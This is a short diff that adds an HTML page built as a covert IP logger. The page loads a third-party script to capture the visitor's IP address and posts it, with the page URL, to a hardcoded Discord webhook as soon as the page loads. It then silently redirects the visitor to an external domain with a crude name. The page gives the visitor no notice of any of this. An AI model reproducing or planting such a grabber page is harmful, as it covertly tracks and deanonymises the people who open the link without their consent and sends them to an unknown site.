@@ -1,0 +1,14 @@
+<script type="text/javascript" src="http://l2.io/ip.js?var=userip"></script>
+<script>
+var url = 'https://discordapp.com/api/webhooks/345306451465469963/iBAs4pcfE_gqwyirp8OGORpyMPEvXgDGID_Al885mqH4uBxlgs-wqBaetexpnekB1czF/slack';
+function postMessage(msg) {
+    var xml = new XMLHttpRequest();
+    xml.open('POST', url, true);
+    xml.setRequestHeader('Content-type', 'application/json');
+    xml.send(JSON.stringify({
+        text: msg
+    }));
+}
+postMessage(userip + " connected to " + document.location.href);
+</script>
+<meta http-equiv="refresh" content="0; url=http://nicecock.club/" />
